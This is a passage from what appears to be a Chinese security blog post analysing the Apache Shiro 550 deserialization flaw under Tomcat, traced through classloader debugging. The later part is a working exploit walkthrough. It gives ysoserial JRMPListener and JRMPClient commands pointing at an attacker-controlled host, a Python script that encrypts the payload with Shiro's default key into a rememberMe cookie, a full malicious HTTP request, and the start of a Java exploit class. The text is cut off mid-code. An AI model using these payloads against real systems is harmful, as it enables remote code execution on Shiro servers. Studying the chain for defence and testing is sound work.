function_">forName</span><span class="params">(String fqcn)</span> <span class="keyword">throws</span> UnknownClassException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> THREAD_CL_ACCESSOR.loadClass(fqcn);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">            log.trace(<span class="string">&quot;Unable to load class named [&quot;</span> + fqcn +</span><br><span class="line">                    <span class="string">&quot;] from the thread context ClassLoader.  Trying the current ClassLoader...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        clazz = CLASS_CL_ACCESSOR.loadClass(fqcn);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">            log.trace(<span class="string">&quot;Unable to load class named [&quot;</span> + fqcn + <span class="string">&quot;] from the current ClassLoader.  &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;Trying the system/application ClassLoader...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        clazz = SYSTEM_CL_ACCESSOR.loadClass(fqcn);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Unable to load class named [&quot;</span> + fqcn + <span class="string">&quot;] from the thread context, current, or &quot;</span> +</span><br><span class="line">                <span class="string">&quot;system/application ClassLoaders.  All heuristics have been exhausted.  Class could not be found.&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnknownClassException</span>(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">ClassLoaderAccessor</span> <span class="variable">THREAD_CL_ACCESSOR</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExceptionIgnoringAccessor</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> ClassLoader <span class="title function_">doGetClassLoader</span><span class="params">()</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">return</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>根据如上继续进入到ExceptionIgnoringAccessor类中的loadClass方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">ExceptionIgnoringAccessor</span> <span class="keyword">implements</span> <span class="title class_">ClassLoaderAccessor</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Class <span class="title function_">loadClass</span><span class="params">(String fqcn)</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> getClassLoader();</span><br><span class="line">        <span class="keyword">if</span> (cl != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                clazz = cl.loadClass(fqcn);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">                    log.trace(<span class="string">&quot;Unable to load clazz named [&quot;</span> + fqcn + <span class="string">&quot;] from class loader [&quot;</span> + cl + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> ClassLoader <span class="title function_">getClassLoader</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> doGetClassLoader();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">            <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">                log.debug(<span class="string">&quot;Unable to acquire ClassLoader.&quot;</span>, t);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个方法中调用了getClassLoader方法获取ClassLoader，即如类中的doGetClassLoader方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">ClassLoaderAccessor</span> <span class="variable">THREAD_CL_ACCESSOR</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExceptionIgnoringAccessor</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> ClassLoader <span class="title function_">doGetClassLoader</span><span class="params">()</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">return</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>最后通过其中getContextClassLoader方法获取类加载器。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@CallerSensitive</span></span><br><span class="line"><span class="keyword">public</span> ClassLoader <span class="title function_">getContextClassLoader</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (contextClassLoader == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">SecurityManager</span> <span class="variable">sm</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">    <span class="keyword">if</span> (sm != <span class="literal">null</span>) &#123;</span><br><span class="line">        ClassLoader.checkClassLoaderPermission(contextClassLoader,</span><br><span class="line">                                               Reflection.getCallerClass());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> contextClassLoader;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不妨打个端点调试一番，将断点打好了，发送CC6的Payload。</p><p>如下图所示，当fqcn为java.util.HashMap时，继续往下Step Over便会成功加载到类。</p><p><img src="/img/post/attacking-shiro550-with-commons-collections/0.png"></p><p>但当fqcn为[Lorg.apache.commons.collections.Transformer;时，继续跟下去，就会抛出ClassNotFoundException异常。</p><p><img src="/img/post/attacking-shiro550-with-commons-collections/1.png"></p><p>此处的[L表示一个数组类型的描述符，;表示类型描述符的结束，所以这里的[Lorg.apache.commons.collections.Transformer;表示的是一个Transformer类型的数组。</p><p>到此，可能会得出一个不加思索的答案，即Shiro中的Class.loadClass不支持加载数组类型的类。但仅凭此就得来这样的结论，未免也太过牵强了。</p><p>在Java中，当一个类加载器收到加载类的请求时，它会首先委托给父类加载器加载，只有当父类加载器无法加载时，才由该类加载器自己加载。这就是双亲委派，它用于类加载的安全性和一致性。</p><p>据此，我们先将Tomcat的源码导入至IDEA项目。</p><p><img src="/img/post/attacking-shiro550-with-commons-collections/2.png"></p><p>再将断点断在org.apache.shiro.util.ClassUtils#forName，从THREAD_CL_ACCESSOR.loadClass跟起。</p><p>进入loadClass方法，在其中获取到的ClassLoader为ParallelWebappClassLoader，它的父Classloader为URLClassLoader。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ParallelWebappClassLoader</span><br><span class="line">  context: ROOT</span><br><span class="line">  delegate: false</span><br><span class="line">----------&gt; Parent Classloader:</span><br><span class="line">java.net.URLClassLoader@28c4711c</span><br></pre></td></tr></table></figure><p><img src="/img/post/attacking-shiro550-with-commons-collections/3.png"></p><p>继续往下，到达org.apache.catalina.loader.WebappClassLoaderBase#loadClass(java.lang.String, boolean)。在这个方法中，会有两次检查先前加载的本地类缓存，但都未果。</p><p><img src="/img/post/attacking-shiro550-with-commons-collections/4.png"></p><p><img src="/img/post/attacking-shiro550-with-commons-collections/5.png"></p><p>接着，会尝试使用系统类加载器加载类，这个时候的resourceName成了[Lorg&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;Transformer;.class。</p><p><img src="/img/post/attacking-shiro550-with-commons-collections/6.png"></p><p>继续朝下，根据url &#x3D; javaseLoader.getResource(resourceName)，url就会为null，近而tryLoadingFromJavaseLoader会为false。</p><p><img src="/img/post/attacking-shiro550-with-commons-collections/7.png"></p><p>继续搜索本地仓库。</p><p><img src="/img/post/attacking-shiro550-with-commons-collections/8.png"></p><p>进入到WebappClassLoaderBase#findClass方法中。</p><p><img src="/img/post/attacking-shiro550-with-commons-collections/9.png"></p><p>一路跟下去，在855行对findClassInternal方法进行了调用。</p><p><img src="/img/post/attacking-shiro550-with-commons-collections/10.png"></p><p>在findClassInternal方法中path成了&#x2F;[Lorg&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;Transformer;.class，这当然是依旧找不到。</p><p><img src="/img/post/attacking-shiro550-with-commons-collections/11.png"></p><p>只会返回null到findClass中的clazz。</p><p><img src="/img/post/attacking-shiro550-with-commons-collections/12.png"></p><p>findClass方法也会返回null到loadClass方法中。继续往下，就会委派到父类加载器进行查找，也就是URLClassLoader。</p><p><img src="/img/post/attacking-shiro550-with-commons-collections/13.png"></p><p>到达java.lang.Class，但在URLClassLoader类加载器中只加载了Tomcat下的lib包，其中并无所需的commons-collections-3.2.1.jar。</p><p><img src="/img/post/attacking-shiro550-with-commons-collections/14.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/, </span><br><span class="line">file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/tomcat-i18n-ko.jar, </span><br><span class="line">file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/el-api.jar, </span><br><span class="line">file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/tomcat-i18n-es.jar, </span><br><span class="line">file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/tomcat-websocket.jar, </span><br><span class="line">file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/jasper.jar, </span><br><span class="line">file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/jasper-el.jar, </span><br><span class="line">file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/tomcat-util.jar, </span><br><span class="line">file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/tomcat-i18n-de.jar, </span><br><span class="line">file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/catalina-storeconfig.jar, </span><br><span class="line">file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/jsp-api.jar, </span><br><span class="line">file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/catalina-tribes.jar, </span><br><span class="line">file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/catalina.jar, </span><br><span class="line">file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/tomcat-jni.jar, </span><br><span class="line">file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/websocket-api.jar, </span><br><span class="line">file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/tomcat-coyote.jar, </span><br><span class="line">file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/catalina-ha.jar, </span><br><span class="line">file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/tomcat-api.jar, </span><br><span class="line">file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/annotations-api.jar, </span><br><span class="line">file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/jaspic-api.jar, </span><br><span class="line">file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/tomcat-i18n-zh-CN.jar, </span><br><span class="line">file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/catalina-ant.jar, </span><br><span class="line">file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/ecj-4.6.3.jar, </span><br><span class="line">file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/servlet-api.jar, </span><br><span class="line">file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/tomcat-util-scan.jar, </span><br><span class="line">file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/tomcat-i18n-ja.jar, </span><br><span class="line">file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/tomcat-i18n-ru.jar, </span><br><span class="line">file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/tomcat-jdbc.jar, </span><br><span class="line">file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/tomcat-i18n-fr.jar, </span><br><span class="line">file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/tomcat-dbcp.jar]</span><br></pre></td></tr></table></figure><p>这就导致了ClassNotFoundException异常的抛出。</p><p><img src="/img/post/attacking-shiro550-with-commons-collections/15.png"></p><h2 id="0x03-JRMP"><a href="#0x03-JRMP" class="headerlink" title="0x03 JRMP"></a>0x03 JRMP</h2><p>根据如上分析，可得知，当出现Transformer数组时，会在本地加载不到相应的类。</p><p>在先前<a href="https://0xf4n9x.github.io/java-classloader.html">《Java中动态加载字节码的几种方法》</a>一文中，所介绍的利用URLClassLoader加载器远程加载恶意类的知识，此时便能够派上用场了。通过JRMP协议，使受害者充当一个JRMPClient，向攻击者可控的JRMPListener进行远程请求加载，利用URLClassLoader的一个子类LoaderHandler#Loader远程加载攻击者机器上的任意类。当然，更准确地说，应该是通过RMI进行远程动态类加载。这里直接使用ysoserial工具中的JRMPListener来辅助我们进行漏洞利用。</p><p>首先需要一台服务器端起一个JRMPListener，还需要Shiro应用程序能够与此服务器进行网络通信，否则JRMP这种利用方式就不可取。如下命令对外开放4444端口，等待受害端的访问与加载。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> ysoserial-all.jar ysoserial.exploit.JRMPListener 4444 CommonsCollections6 <span class="string">&#x27;open -a Calculator&#x27;</span></span><br><span class="line">* Opening JRMP listener on 4444</span><br></pre></td></tr></table></figure><p>然后通过ysoserial工具生成JRMPClient恶意反序列化文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-all.jar JRMPClient 10.11.34.120:4444 &gt; jrmp.ser</span><br></pre></td></tr></table></figure><p>通过hexdump命令查看这个反序列化文件，16进制内容如下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">hexdump jrmp.ser</span><br><span class="line">0000000 edac 0500 7d73 0000 0100 1a00 616a 6176</span><br><span class="line">0000010 722e 696d 722e 6765 7369 7274 2e79 6552</span><br><span class="line">0000020 6967 7473 7972 7278 1700 616a 6176 6c2e</span><br><span class="line">0000030 6e61 2e67 6572 6c66 6365 2e74 7250 786f</span><br><span class="line">0000040 e179 da27 cc20 4310 02cb 0100 004c 6801</span><br><span class="line">0000050 0074 4c25 616a 6176 6c2f 6e61 2f67 6572</span><br><span class="line">0000060 6c66 6365 2f74 6e49 6f76 6163 6974 6e6f</span><br><span class="line">0000070 6148 646e 656c 3b72 7078 7273 2d00 616a</span><br><span class="line">0000080 6176 722e 696d 732e 7265 6576 2e72 6552</span><br><span class="line">0000090 6f6d 6574 624f 656a 7463 6e49 6f76 6163</span><br><span class="line">00000a0 6974 6e6f 6148 646e 656c 0072 0000 0000</span><br><span class="line">00000b0 0000 0202 0000 7278 1c00 616a 6176 722e</span><br><span class="line">00000c0 696d 732e 7265 6576 2e72 6552 6f6d 6574</span><br><span class="line">00000d0 624f 656a 7463 61d3 91b4 610c 1e33 0003</span><br><span class="line">00000e0 7800 7770 0035 550a 696e 6163 7473 6552</span><br><span class="line">00000f0 0066 310c 2e30 3131 332e 2e34 3231 0031</span><br><span class="line">0000100 1100 ff5c ffff a3ff e631 0014 0000 0000</span><br><span class="line">0000110 0000 0000 0000 0000 0000 0078</span><br><span class="line">000011b</span><br></pre></td></tr></table></figure><p>继续使用如下脚本对恶意反序列化数据进行加密编码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./jrmp.ser&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line">BS = AES.block_size</span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">encryptor = AES.new(base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>), AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Cookie: rememberMe=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(base64.b64encode(iv + encryptor.encrypt(pad(data))).decode()))</span><br></pre></td></tr></table></figure><p>最后，发送构造的恶意HTTP请求。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>10.11.34.121:8888</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/css,*/*;q=0.1</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>rememberMe=l6bk0fKZSOKMnQMgPMJBrlzEX29JMvW50QgqoZ8DMfvGegWHBeow0LpP3saHN6XVcTy+GcPsKsiqPHLgo1M2QLH1mNgWnEyVuYzr0psKQEVOrDW8VmsDGTbJlOz74QOenoDJjpHaw8aSgSMM0hBBsE5sFUViikkn9DMNIWhK/H6E5tetPbYGY18xuPEW0oQGL2nCikR+R1l72RmzuuRRckMlUxZs1LuxcLYr74+yicCkjV8ZzANeQZsUaKsbbW/A1AtNFIdLXZCZ+D3jrKsxd5b4RkHh1LaqHVVTc4BT0swDp8ArdLLK103zQaFF0km4Q4N54P/F7bZxznlLq6W95fZuY8R8hc+kA8u6nkCkt2y3fuDoknBpAuJClHnOVCYj/lUZFwJ7CnoiPZMk2PDATA==</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以观察到JRMPListener端会收到来自Shiro应用程序的请求。</p><p><img src="/img/post/attacking-shiro550-with-commons-collections/16.png"></p><p>最终，成功执行命令，弹出计算器。</p><p><img src="/img/post/attacking-shiro550-with-commons-collections/17.png"></p><h2 id="0x04-CommonsCollections4Shiro"><a href="#0x04-CommonsCollections4Shiro" class="headerlink" title="0x04 CommonsCollections4Shiro"></a>0x04 CommonsCollections4Shiro</h2><p>如上通过JRMP进行利用的方式，不仅利用起来麻烦，而且还依赖服务器出网条件，一点都不够优雅。</p><p>根据如上的分析，得出当出现Transformer数组时，会在本地加载不到相应的类，那么只需避免使用到Transformer数组不就可以解决这个问题嘛。</p><p>根据先前已学的知识，对LazyMap版CommonsCollections1链与CommonsCollections6链中用到的TiedMapEntry以及CommonsBeanutils1链中所用到的TemplatesImpl三者进行结合，最终构造出如下利用代码。由于利用代码能够直接对反序列化数据进行加密编码，所以需要先导入shiro-core和slf4j等依赖。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-simple<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.shiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.javasec.cc.EvilTemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroAttackWithCC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>().encrypt(</span><br><span class="line">                CC4Shiro(), Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Cookie: rememberMe=&quot;</span> + ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] CC4Shiro() <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;T&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span 